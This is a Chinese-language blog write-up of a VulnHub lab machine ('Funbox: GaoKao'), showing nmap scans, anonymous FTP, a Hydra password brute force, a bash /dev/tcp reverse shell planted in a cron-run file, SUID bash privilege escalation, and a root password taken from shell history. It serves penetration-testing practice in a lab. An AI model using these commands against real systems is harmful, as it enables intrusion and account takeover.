---
{"dg-publish":true,"title":"vulnhub_GaoKao","tags":["blog"],"dg-path":"安全/靶机/vulnhub_GaoKao.md","permalink":"/安全/靶机/vulnhub_GaoKao/","dgPassFrontmatter":true}
---

# 主机发现

```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# arp-scan --interface=eth1 --localnet
Interface: eth1, type: EN10MB, MAC: 00:0c:29:8e:b5:08, IPv4: 192.168.124.27
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.124.1   88:2a:5e:21:1b:ef       New H3C Technologies Co., Ltd
192.168.124.8   10:a5:1d:71:1b:f5       Intel Corporate
192.168.124.5   12:aa:f8:19:52:b2       (Unknown: locally administered)
192.168.124.4   42:e6:9c:45:84:f5       (Unknown: locally administered)
192.168.124.34  08:00:27:f6:f5:26       PCS Systemtechnik GmbH
192.168.124.7   4e:f4:82:76:df:78       (Unknown: locally administered)


┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# nmap -sT -min-rate 10000 -p- 192.168.124.34
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 07:47 EST
Nmap scan report for 192.168.124.34 (192.168.124.34)
Host is up (0.012s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 08:00:27:F6:F5:26 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 62.94 seconds

```


```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# nmap -sT -sC -sV -O -p21,22,80,3306 192.168.124.34
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 07:49 EST
Nmap scan report for 192.168.124.34 (192.168.124.34)
Host is up (0.0061s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 48:39:31:22:fb:c2:03:44:a7:4e:c0:fa:b8:ad:2f:96 (RSA)
|   256 70:a7:74:5e:a3:79:60:28:1a:45:4c:ab:5c:e7:87:ad (ECDSA)
|_  256 9c:35:ce:f6:59:66:7f:ae:c4:d1:21:16:d5:aa:56:71 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wellcome to Funbox: Gaokao !
3306/tcp open  mysql   MySQL 5.7.34-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.34_Auto_Generated_Server_Certificate
| Not valid before: 2021-06-05T15:15:30
|_Not valid after:  2031-06-03T15:15:30
|_ssl-date: TLS randomness does not represent time
| mysql-info:
|   Protocol: 10
|   Version: 5.7.34-0ubuntu0.18.04.1
|   Thread ID: 6
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SwitchToSSLAfterHandshake, ConnectWithDatabase, Speaks41ProtocolOld, IgnoreSigpipes, FoundRows, SupportsLoadDataLocal, ODBCClient, LongColumnFlag, IgnoreSpaceBeforeParenthesis, InteractiveClient, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsCompression, LongPassword, SupportsTransactions, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: J\x15\x0B>\x18hl\x08C\x053j\x11tOF4\x01\x13M
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:F6:F5:26 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.13 seconds

```



# 初步渗透

```sh
┌──(root㉿kali)-[~/workspace/pentest/visions]
└─# dirb http://192.168.124.34/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Feb  9 07:53:03 2025
URL_BASE: http://192.168.124.34/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.124.34/ ----
+ http://192.168.124.34/index.html (CODE:200|SIZE:10310)
+ http://192.168.124.34/server-status (CODE:403|SIZE:279)

-----------------
END_TIME: Sun Feb  9 07:53:43 2025
DOWNLOADED: 4612 - FOUND: 2

```


目录扫描没什么结果，只能看看ftp服务了

```sh
┌──(root㉿kali)-[~]
└─# ftp 192.168.124.34
Connected to 192.168.124.34.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.124.34]
Name (192.168.124.34:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.124.27 !
230-
230-The local time is: Sun Feb 09 13:19:34 2025
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <sky@funbox9>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>ls -al
229 Entering Extended Passive Mode (|||5713|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 .
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 ..
-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
226 Transfer complete
ftp> get welcome.msg
local: welcome.msg remote: welcome.msg
229 Entering Extended Passive Mode (|||7064|)
150 Opening BINARY mode data connection for welcome.msg (169 bytes)
100% |**************************************|   169      236.78 KiB/s    00:00 ETA
226 Transfer complete
169 bytes received in 00:00 (7.59 KiB/s)

```

就一个文件，下载下来看看
```sh
┌──(root㉿kali)-[~/workspace/pentest/GaoKao]
└─# cat welcome.msg
Welcome, archive user %U@%R !

The local time is: %T

This is an experimental FTP server.  If you have any unusual problems,
please report them via e-mail to <sky@%L>.

```

里面一个有用信息是用户名
```
sky
```

```sh
┌──(root㉿kali)-[~]
└─# ftp sky@192.168.124.34
Connected to 192.168.124.34.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.124.34]
331 Password required for sky
Password:
```
确实是有，但是需要密码


没别的信息，爆破一下试试
```sh
┌──(root㉿kali)-[~]
└─# hydra -l sky -P /usr/share/wordlists/rockyou.txt  192.168.124.34 ftp -vV -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 08:42:52
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ftp://192.168.124.34:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done

```

![Pasted image 20250209215523.png](/img/user/picture/Pasted%20image%2020250209215523.png)


得到密码
```
thebest
```


```sh
ftp> ls -al
229 Entering Extended Passive Mode (|||65050|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .
drwxr-xr-x   5 root     root         4096 Jun  5  2021 ..
-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history
-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout
-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc
-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile
drwxr-----   2 root     root         4096 Jun  5  2021 .ssh
-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag
-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo

```


```sh
┌──(root㉿kali)-[~/workspace/pentest/GaoKao]
└─# cat .bash_history

exit
pwd
cd ..
cd sky
pwd
ls -la
vi .bash_history
exit

┌──(root㉿kali)-[~/workspace/pentest/GaoKao]
└─# cat user.flag
#!/bin/sh
echo "Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd"

```



上传一个反弹shell
```sh
#!/bin/sh  
bash -i >& /dev/tcp/192.168.124.27/1234 0>&1
```

emmm,这里卡了有一会，主要是不知道如何去触发这个反弹shell
看大佬wp是替换掉`user.flag`这个文件
这个靶机好像是有有自动任务，过一段时间去执行这个文件

替换的方法也很简单，上传一个同名文件就可以
```sh
┌──(root㉿kali)-[~/workspace/pentest/GaoKao]
└─# cat user.flag
#!/bin/sh
bash -i >& /dev/tcp/192.168.124.27/1234 0>&1

ftp> put user.flag
local: user.flag remote: user.flag
229 Entering Extended Passive Mode (|||11941|)
150 Opening BINARY mode data connection for user.flag
100% |**************************************|    55       29.83 KiB/s    00:00 ETA
226 Transfer complete
55 bytes sent in 00:00 (2.58 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||35063|)
150 Opening ASCII mode data connection for file list
-rwxr-xr-x   1 sky      sky            55 Feb  9 14:07 rev.sh
-rwxr-x---   1 sky      sarah          55 Feb  9 14:18 user.flag
226 Transfer complete

```

监听一会就收到shell了
![Pasted image 20250209222252.png](/img/user/picture/Pasted%20image%2020250209222252.png)

用pspy看一下确实存在自动化任务
![Pasted image 20250209223051.png](/img/user/picture/Pasted%20image%2020250209223051.png)



# 提权

`sudo -l`看不了，那就脚本扫一下
![Pasted image 20250209223329.png](/img/user/picture/Pasted%20image%2020250209223329.png)

`/bin/bash`有SUID
![Pasted image 20250209230110.png](/img/user/picture/Pasted%20image%2020250209230110.png)

```sh
bash-4.4$ /bin/bash -p
/bin/bash -p
id
uid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)

```

这就算结束了吧
![Pasted image 20250209223550.png](/img/user/picture/Pasted%20image%2020250209223550.png)


后面在看`/home/lucy`或许还有点东西
```sh
bash-4.4# ls -al
ls -al
total 36
drwxr-xr-x 4 lucy lucy 4096 Jun  6  2021 .
drwxr-xr-x 5 root root 4096 Jun  5  2021 ..
-rw------- 1 lucy lucy  192 Jun  6  2021 .bash_history
-rw-r--r-- 1 lucy lucy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 lucy lucy 3771 Apr  4  2018 .bashrc
drwx------ 2 lucy lucy 4096 Jun  5  2021 .cache
drwx------ 3 lucy lucy 4096 Jun  5  2021 .gnupg
-rw-r--r-- 1 lucy lucy  807 Apr  4  2018 .profile
-rw-r--r-- 1 lucy lucy    0 Jun  5  2021 .sudo_as_admin_successful
-rw------- 1 lucy lucy  702 Jun  6  2021 .viminfo
bash-4.4# cat .bash_history
cat .bash_history
passwd root
sudo passwd root
su root
apt update && apt upgrade
su root
sudo passwd root
su root
exit
su root
exit
su root
qayxswWW
ls
id
exit

```

```sh
bash-4.4# id
id
uid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)
bash-4.4# su root
su root
Password: qayxswWW

root@funbox9:/home/lucy# id
id
uid=0(root) gid=0(root) groups=0(root)

```

果然，喜欢在history里面藏密码





# 总结

这个难度还是得借助大佬的WP，不足在于不太熟悉ftp服务，对于ftp的渗透利用确实不太熟悉
再就是那个自动化任务太难发现
```txt
/var/spool/cron/crontabs/<用户名>
```

提权部分还好








